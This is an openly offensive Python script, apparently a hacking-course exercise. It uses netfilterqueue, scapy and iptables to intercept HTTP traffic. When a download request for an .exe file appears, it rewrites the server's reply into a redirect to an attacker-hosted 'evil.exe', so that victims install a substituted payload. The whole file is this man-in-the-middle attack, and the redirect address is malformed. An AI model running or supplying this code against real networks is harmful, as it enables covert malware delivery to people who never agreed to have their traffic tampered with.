#echo 1 > /proc/sys/net/ipv4/ip_forward
#command before running this program, "iptables -I OUTPUT -j NFQUEUE --queue-num 0"
#command before running this program, "iptables -I INPUT -j NFQUEUE --queue-num 0"
#Showing packets and their responses
#!usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("Replacing File")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://1192.168.0.107/evil-files/evil.exe\n\n"

                del scapy_packet[scapy.TCP].chksum
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.IP].len
                packet.set_payload(str(scapy_packet))
                print("setpayload")
                # print(scapy_packet.show())





    #this will forward the all packets
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
# 0 because we specified 0 queue-num in command, "iptables -I INPUT -j NFQUEUE --queue-num 0"
queue.bind(0,process_packet)
queue.run()